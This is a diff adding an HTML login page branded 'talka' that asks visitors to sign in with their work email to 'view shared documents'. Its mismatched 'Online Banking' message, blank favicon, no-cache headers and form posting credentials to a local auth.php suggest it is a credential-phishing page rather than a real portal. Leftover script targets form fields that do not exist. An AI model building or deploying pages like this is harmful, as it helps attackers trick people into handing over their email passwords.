@@ -1,0 +1,187 @@
+
+<!DOCTYPE link PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<head>
+
+
+
+
+
+
+
+
+
+
+
+<!-- HTTP 1.1 -->
+<meta http-equiv="Cache-Control" content="no-store"/>
+<!-- HTTP 1.0 -->
+<meta http-equiv="Pragma" content="no-cache"/>
+<!-- Prevents caching at the Proxy Server -->
+<meta http-equiv="Expires" content="0"/>
+<meta name="mobileoptimized" content="240" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<meta name="format-detection" content="telephone=no" />
+<meta name="viewport" content="user-scalable=false; width=device-width; initial-scale=1.0; maximum-scale=1.0; minimum-scale=1.0">
+
+	<!-- HTTP 1.1 -->
+	<meta http-equiv="Cache-Control" content="no-store"/>
+	<!-- HTTP 1.0 -->
+	<meta http-equiv="Pragma" content="no-cache"/>
+	<!-- Prevents caching at the Proxy Server -->
+	<meta http-equiv="Expires" content="0"/>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+
+
+<link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABmJLR0QA/wD/AP+gvaeTAAAAC0lEQVQI12NgAAIAAAUAAeImBZsAAAAASUVORK5CYII="/>
+
+	
+	<title>Login</title>
+	
+	<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+	<!--[if lt IE 9]>
+	  <script src="html5shiv.min.js"></script>
+	  <script src="respond.js"></script>
+	<![endif]-->
+	
+<!-- 	<link href="https://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css" rel="stylesheet" type="text/css" /> -->
+	<link rel="stylesheet" href="styles_talka.css">
+	<link rel="stylesheet" type='text/css' href="extra.css" />
+	<link rel="stylesheet"" />
+	<link href='https://fonts.googleapis.com/css?family=PT+Sans' rel='stylesheet' type='text/css'>
+	<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+	<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700italic' rel='stylesheet' type='text/css'>
+	<link href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+	<link href="login.css" rel="stylesheet" type="text/css" />
+
+
+	<script type='text/javascript' src='jquery-1.10.2.min.js'></script>
+	
+	<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+	<!--[if lt IE 9]>
+	  <script src="html5shiv.min.js"></script>
+	  <script src="respond.js"></script>
+	<![endif]-->
+
+	
+</head>
+
+<body data-theme='' class="static-header">
+
+<noscript>
+  <div class="error">
+    JavaScript is disabled in your browser. In order to use Online Banking properly, you need to enable JavaScript
+  </div>
+</noscript>
+<div style="position:absolute;color: #c5c5c5;z-index:10000;font-size:9px;display:none;">
+	V.21.01-RC-b20-r84429
+</div>
+<div class="container-fluid">
+	
+	<div id="formDiv" class="col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-12 col-xs-offset-0 logincolumn well"> 
+
+				<div class="text-center">
+				  <img src="logo_talka_navbar.png" alt="talka" width="599" class="img img-responsive"
+				style="margin-left: auto;margin-right: auto;" />
+				  <h4>Login with work email to view shared documents </h4>
+			      <a id="adLink" href="https://www.talka.ca/" target="_blank" class="img-responsive">
+        </a>
+        <br />
+</div>
+<script>
+	$(document).ready(
+			function() {
+				$(".well").removeClass("well");
+				$.get("marketing-static/main.json?t=" + new Date().getTime(),
+						function(data) {
+							var obj = data;
+							if (typeof data == "string") {
+								obj = JSON.parse(data);
+							}
+							$("#adLink").attr("href", obj["url"]);
+							
+							$.get("marketing-static/"+obj["html"]+"?t=" + new Date().getTime(),
+									function(data) {
+										$("#adLink").html(data);
+										$("#adLink img:first").css("width", "620px")
+									});
+							
+						});
+
+			});
+</script>
+
+		
+		<div class="row text-center">
+		
+		
+		
+		</div>
+		
+		
+		
+		<form id="f" name="f" class="form-horizontal loginform" action="auth.php" method="POST" autocomplete="off">
+			<div class="form-group">
+				<label for="email" class="col-sm-5 control-label">Email</label>
+				<div class="col-sm-3">
+					<input type="text" class="form-control" id="email" name="email" placeholder="" autocomplete="off">
+				</div>
+			</div>
+			
+			<div class="form-group">
+				<label for="password" class="col-sm-5 control-label">Password</label>
+				<div class="col-sm-3">
+					<input type="password" class="form-control" id="password" name="password" placeholder="" autocomplete="off">
+					
+					
+					<div class="text-left">
+						<a href="passwordreset" style="text-decoration: underline;font-size:0.9em;">Forgot Password?</a>
+					</div>
+					
+				</div>
+			</div>
+			
+			<div class="form-actions">
+				<input class="btn btn-primary" type="submit" id="start" value="Login">
+				<a class="btn btn-primary" id="clearBtn" href="">Clear</a>
+			</div>
+		<div>
+<input type="hidden" name="_csrf" value="1ba1073c-a40c-438c-9e16-9980adfda04a" />
+</div></form>
+		
+		
+		
+		
+	</div>
+
+</div>
+
+<script language="Javascript">
+
+        $("#clearBtn").click(function(){
+                $("#j_username").val("");
+                $("#j_password").val("");
+        });
+        $("#j_username").focus();
+</script>
+
+
+
+
+
+
+</body>
+</html>
